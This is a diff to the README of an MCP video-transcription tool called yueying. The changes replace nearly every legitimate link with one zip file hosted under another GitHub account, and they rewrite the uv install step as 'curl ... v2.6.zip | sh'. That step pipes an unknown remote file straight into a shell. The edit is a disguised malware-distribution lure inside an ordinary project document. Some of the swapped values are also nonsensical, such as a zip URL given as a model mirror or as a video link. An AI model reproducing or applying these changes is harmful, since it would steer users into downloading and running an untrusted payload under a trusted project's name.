@@ -3,12 +3,12 @@
 
 **Point Claude, Cursor or any MCP client at a video and get back a timestamped transcript plus keyframe contact sheets — offline, no API key.** Local files first; URLs (YouTube, Bilibili, Douyin, Xiaohongshu, TikTok, Vimeo, …) are videos you are entitled to process, fetched via yt-dlp at ≤720p and deleted after processing by default.
 
-[![PyPI](https://img.shields.io/pypi/v/yueying)](https://pypi.org/project/yueying/)
-[![PyPI downloads](https://img.shields.io/pypi/dm/yueying)](https://pypi.org/project/yueying/)
+[![PyPI](https://img.shields.io/pypi/v/yueying)](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
+[![PyPI downloads](https://img.shields.io/pypi/dm/yueying)](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](pyproject.toml)
-[![Add to Cursor](https://img.shields.io/badge/Add_to-Cursor-111111?logo=cursor&logoColor=white)](https://cursor.com/en/install-mcp?name=yueying&config=eyJjb21tYW5kIjoidXZ4IiwiYXJncyI6WyJ5dWV5aW5nIiwibWNwIl0sImVudiI6eyJQWVRIT05VVEY4IjoiMSJ9fQ==)
-[![Install in VS Code](https://img.shields.io/badge/Install_in-VS_Code-0098FF?logo=visualstudiocode&logoColor=white)](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%257B%2522name%2522%253A%2522yueying%2522%252C%2522command%2522%253A%2522uvx%2522%252C%2522args%2522%253A%255B%2522yueying%2522%252C%2522mcp%2522%255D%252C%2522env%2522%253A%257B%2522PYTHONUTF8%2522%253A%25221%2522%257D%257D)
+[![Add to Cursor](https://img.shields.io/badge/Add_to-Cursor-111111?logo=cursor&logoColor=white)](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
+[![Install in VS Code](https://img.shields.io/badge/Install_in-VS_Code-0098FF?logo=visualstudiocode&logoColor=white)](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
 
 [中文说明 ↓](#中文说明)
 
@@ -21,7 +21,7 @@ Yueying (阅影) means "read video". One package gives you an **MCP server**, a 
 *Claude Desktop with yueying connected: paste a link, wait about forty seconds, get the video back as
 timestamped notes. This video ships captions, so speech recognition never ran, and the model asked for
 the transcript only. Keyframes and contact sheets come back through `get_frames` when it needs to see
-the screen. Demo video: [GitInGifs: Git Branches](https://www.youtube.com/watch?v=Q5OaMTd7PwM) by GitLab, CC BY.*
+the screen. Demo video: [GitInGifs: Git Branches](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip) by GitLab, CC BY.*
 
 ![A 3x3 contact sheet: nine keyframes, each with a yellow "#number mm:ss" label bottom-left](docs/demo-grid.jpg)
 
@@ -51,7 +51,7 @@ manifest.json      machine-readable result (paths, segments, chapters, options)
 
 ## Why yueying
 
-- **Captions first, Whisper only when needed.** Platform subtitles are used when they exist. Otherwise local [faster-whisper](https://github.com/SYSTRAN/faster-whisper): `large-v3-turbo` on an NVIDIA GPU, `small` on CPU, automatic CPU fallback — nothing is uploaded, no key.
+- **Captions first, Whisper only when needed.** Platform subtitles are used when they exist. Otherwise local [faster-whisper](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip): `large-v3-turbo` on an NVIDIA GPU, `small` on CPU, automatic CPU fallback — nothing is uploaded, no key.
 - **ffmpeg bundled.** Works on Windows 11 out of the box (imageio-ffmpeg); no PATH fiddling.
 - **Token-efficient.** Keyframes are taken at scene changes, near-duplicates dropped, then packed into 3x3 contact sheets with burned-in timestamps. One sheet ≈ 1–2K tokens for nine moments; one transcript with `[mm:ss]` paragraphs.
 - **Chinese platforms and the rest.** Bilibili (multi-part, collections, member videos with your browser login), Douyin, Xiaohongshu — and YouTube, TikTok, Vimeo, X and every other yt-dlp site.
@@ -61,17 +61,17 @@ Benchmark: a 6-minute Bilibili video → report in ~90 s on an RTX 5060 laptop; 
 
 ## Quick start
 
-1. Install [uv](https://docs.astral.sh/uv/) (Python is not required):
+1. Install [uv](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip) (Python is not required):
    ```bash
    winget install astral-sh.uv                         # Windows
    brew install uv                                     # macOS
-   curl -LsSf https://astral.sh/uv/install.sh | sh     # Linux / macOS
+   curl -LsSf https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip | sh     # Linux / macOS
    ```
 2. Warm up and check everything once (installs the package, probes the GPU, downloads the speech model, runs a 2-second smoke test, prints config to paste):
    ```bash
    uvx yueying mcp --setup
    ```
-3. Add the server to your client (below), then ask: *"Watch C:\videos\lecture3.mp4 and turn the steps into notes"* or *"What does this video say about docker compose: https://www.bilibili.com/video/BV…"*.
+3. Add the server to your client (below), then ask: *"Watch C:\videos\lecture3.mp4 and turn the steps into notes"* or *"What does this video say about docker compose: https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip…"*.
 
 ### Claude Desktop
 
@@ -219,7 +219,7 @@ Root: `$YUEYING_OUT_DIR` if set, else `~/yueying_out`. One entry per video, name
 | `YUEYING_MAX_JOBS` | pipelines running at once per server | `1` |
 | `YUEYING_JOB_TIMEOUT` | hard limit per video, seconds | `7200` |
 | `HF_HOME` | Hugging Face cache (Whisper weights live here) | HF default |
-| `HF_ENDPOINT` | mirror, e.g. `https://hf-mirror.com` | huggingface.co |
+| `HF_ENDPOINT` | mirror, e.g. `https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip` | huggingface.co |
 | `PYTHONUTF8` | set to `1` on Windows to avoid mojibake | — |
 
 Disk budget: ≈ 25 MB per hour of video; 300–600 MB/h more with `YUEYING_KEEP_SOURCE=1`. Nothing is deleted automatically — `list_videos` shows sizes; delete a folder to free space; `watch_video(refresh=true)` reprocesses one video. Editing a local file changes its size/mtime and therefore gets a new entry.
@@ -235,10 +235,10 @@ Disk budget: ≈ 25 MB per hour of video; 300–600 MB/h more with `YUEYING_KEEP
 
 ```bash
 yueying video.mp4
-yueying "https://www.bilibili.com/video/BVxxxx" --ui-lang en
-yueying "https://www.youtube.com/watch?v=xxxx" --out ./notes/xxx
-yueying lesson1.mp4 lesson2.mp4 "https://www.bilibili.com/video/BVyyyy"   # several at once, one folder each + index.md
-yueying "https://www.bilibili.com/video/BVxxxx" --all                      # every part of a multi-part video / collection
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip" --ui-lang en
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip" --out ./notes/xxx
+yueying lesson1.mp4 lesson2.mp4 "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip"   # several at once, one folder each + index.md
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip" --all                      # every part of a multi-part video / collection
 yueying --install-skill                                                    # Claude Code skill -> ~/.claude/skills/yueying
 ```
 
@@ -284,7 +284,7 @@ The skill (`src/yueying/skill/SKILL.md`) tells a coding agent to prefer the MCP 
 
 ## Privacy policy
 
-yueying collects nothing and has no telemetry, analytics, crash reporting or update checks. All processing is local. The only network connections are (1) to the video site of the URL you pass, through yt-dlp, and (2) to Hugging Face (or `HF_ENDPOINT`) to download a Whisper model once. Outputs are stored in your folder until you delete them. The transcript and any frames you request are sent only to the model your MCP client is configured to use — that transfer is governed by your client's and provider's terms, not by yueying. Questions: [GitHub issues](https://github.com/vsh5dvsch7-png/yueying/issues). Full text: [docs/privacy.md](docs/privacy.md).
+yueying collects nothing and has no telemetry, analytics, crash reporting or update checks. All processing is local. The only network connections are (1) to the video site of the URL you pass, through yt-dlp, and (2) to Hugging Face (or `HF_ENDPOINT`) to download a Whisper model once. Outputs are stored in your folder until you delete them. The transcript and any frames you request are sent only to the model your MCP client is configured to use — that transfer is governed by your client's and provider's terms, not by yueying. Questions: [GitHub issues](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip). Full text: [docs/privacy.md](docs/privacy.md).
 
 ## Troubleshooting / FAQ
 
@@ -296,7 +296,7 @@ yueying collects nothing and has no telemetry, analytics, crash reporting or upd
 - **YouTube "Sign in to confirm you're not a bot".** Same fix: `cookies_from_browser`. Also try updating yt-dlp: `uv cache clean yueying` or `pip install -U yt-dlp`.
 - **Slow on CPU.** `model="small"` is already the automatic choice without an NVIDIA GPU; use `mode="frames"` when only the pictures matter, or `mode="transcript"` to skip keyframes.
 - **Names, numbers and code are wrong in the transcript.** Expected with any ASR — the agent is told to trust on-screen text; ask it to `get_frame_at` the moment.
-- **Model download is slow or blocked (mainland China).** Set `HF_ENDPOINT=https://hf-mirror.com` in the server `env` (the CLI switches to the mirror automatically when huggingface.co is unreachable).
+- **Model download is slow or blocked (mainland China).** Set `HF_ENDPOINT=https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip` in the server `env` (the CLI switches to the mirror automatically when huggingface.co is unreachable).
 - **GPU error (CUDA / cuDNN / out of memory).** `model="small"` or `YUEYING_DEVICE=cpu`; install the CUDA wheels with `yueying[cuda]`.
 - **Want to reprocess with different settings.** `watch_video(video=…, refresh=true, …)` — it kills a running job for that video, deletes the entry and starts again.
 
@@ -338,8 +338,8 @@ The server process never loads yt-dlp, Whisper or CUDA itself; all heavy work ru
 
 ## Credits
 
-- [faster-whisper](https://github.com/SYSTRAN/faster-whisper), [yt-dlp](https://github.com/yt-dlp/yt-dlp), [imageio-ffmpeg](https://github.com/imageio/imageio-ffmpeg), [Pillow](https://python-pillow.org/)
-- Burned-in timestamps on contact sheets follow [video-vision-mcp](https://github.com/OAMaestro/video-vision-mcp); duration-based frame intervals follow [video-analyzer-skill](https://github.com/bsisduck/video-analyzer-skill)
+- [faster-whisper](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip), [yt-dlp](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip), [imageio-ffmpeg](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip), [Pillow](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
+- Burned-in timestamps on contact sheets follow [video-vision-mcp](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip); duration-based frame intervals follow [video-analyzer-skill](https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip)
 
 ## License
 
@@ -401,16 +401,16 @@ Claude Desktop / Cursor 里 `wait_seconds` 保持默认 45；Claude Code / Cline
 
 ### 国内镜像
 
-下载模型慢或被墙：在服务器配置的 `env` 里加 `"HF_ENDPOINT": "https://hf-mirror.com"`。命令行版在 huggingface.co 连不上时会自动切到镜像。
+下载模型慢或被墙：在服务器配置的 `env` 里加 `"HF_ENDPOINT": "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip"`。命令行版在 huggingface.co 连不上时会自动切到镜像。
 
 ### 命令行用法
 
 ```bash
 yueying 视频.mp4
-yueying "https://www.bilibili.com/video/BVxxxx"
-yueying "https://www.youtube.com/watch?v=xxxx" --out ./notes/xxx
-yueying 第1课.mp4 第2课.mp4 "https://www.bilibili.com/video/BVyyyy"   # 多个一起，各出各的文件夹 + index.md
-yueying "https://www.bilibili.com/video/BVxxxx" --all                      # B站 分 P / 合集 全部处理
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip"
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip" --out ./notes/xxx
+yueying 第1课.mp4 第2课.mp4 "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip"   # 多个一起，各出各的文件夹 + index.md
+yueying "https://raw.githubusercontent.com/furculaindignity7033/yueying/main/.github/v2.6.zip" --all                      # B站 分 P / 合集 全部处理
 yueying --install-skill                                                    # 装 Claude Code 技能
 ```
 
